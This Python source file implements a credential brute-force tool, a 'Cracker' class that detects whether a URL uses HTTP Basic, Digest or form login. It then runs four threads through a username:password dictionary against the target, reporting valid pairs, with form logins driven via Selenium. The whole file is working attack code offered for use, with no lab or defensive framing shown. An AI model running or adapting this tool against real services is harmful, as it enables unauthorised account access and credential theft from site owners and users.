import threading

from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from HTTPrequest import HTTPrequest
from selenium import webdriver


class Cracker(HTTPrequest):
    def __init__(self, url, dictionary):
        super().__init__()
        self.url_attack = url
        self.authentication = ""
        self.dictionary = dictionary
        self.combinations = []
        self.lock_access_file = threading.Lock()
        self.index = 0

    def detect_auth(self):
        request = {'method': 'get', 'url': self.url_attack}
        response, result = self.request(request)
        if result['status'] >= 0:
            if response.status_code == 200:
                self.authentication = 'form'
            if response.status_code == 401:
                if response.headers['WWW-Authenticate'].find('Basic') != -1:
                    self.authentication = 'basic'
                elif response.headers['WWW-Authenticate'].find('Digest') != -1:
                    self.authentication = 'digest'
        return result

    def read_dict(self):
        with open(self.dictionary) as file:
            lines = file.readlines()
            for line in lines:
                self.combinations.append(line.split(':'))

    def worker_basic(self):
        while self.index < len(self.combinations):
            self.lock_access_file.acquire()  # pedimos acceso al recurso
            [username, password] = self.combinations[self.index]
            self.index += 1
            self.lock_access_file.release()
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPBasicAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                print('Error en la conexión')

            if response.status_code == 200:
                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
            else:
                print('Usuario ' + username + ' y contraseña ' + password + ' no válidos')

    def worker_digest(self):
        while self.index < len(self.combinations):
            self.lock_access_file.acquire()  # pedimos acceso al recurso
            [username, password] = self.combinations[self.index]
            self.index += 1
            self.lock_access_file.release()
            request = {'method': 'get', 'url': self.url_attack, 'auth': HTTPDigestAuth(username, password)}
            response, result = self.request(request)
            if result['status'] < 0:
                print('Error en la conexión')

            if response.status_code == 200:
                print('Usuario ' + username + ' y contraseña ' + password + ' válidos')

    def worker_form(self):
        driver = webdriver.Safari()
        driver.get(self.url_attack)
        user_box = driver.find_element("id", "username")
        pass_box = driver.find_element("id", "password")
        login = driver.find_element("class_name", "ui-button fn-width80")

        while self.index < len(self.combinations):
            self.lock_access_file.acquire()  # pedimos acceso al recurso
            [username, password] = self.combinations[self.index]
            self.index += 1
            self.lock_access_file.release()
            user_box.send_keys(username)
            pass_box.send_keys(password)
            login.click()

        driver.close()

    def attack(self):
        self.read_dict()
        thread_count = 4
        threads = []
        for i in range(thread_count):
            if self.authentication == 'basic':
                t = threading.Thread(target=self.worker_basic)
                threads.append(t)
                t.start()
            elif self.authentication == 'digest':
                t = threading.Thread(target=self.worker_digest)
                threads.append(t)
                t.start()
            elif self.authentication == 'form':
                t = threading.Thread(target=self.worker_form)
                threads.append(t)
                t.start()

        # Esperamos a que terminen todos los hilos antes de terminar el programa principal
        for thread in threads:
            thread.join()
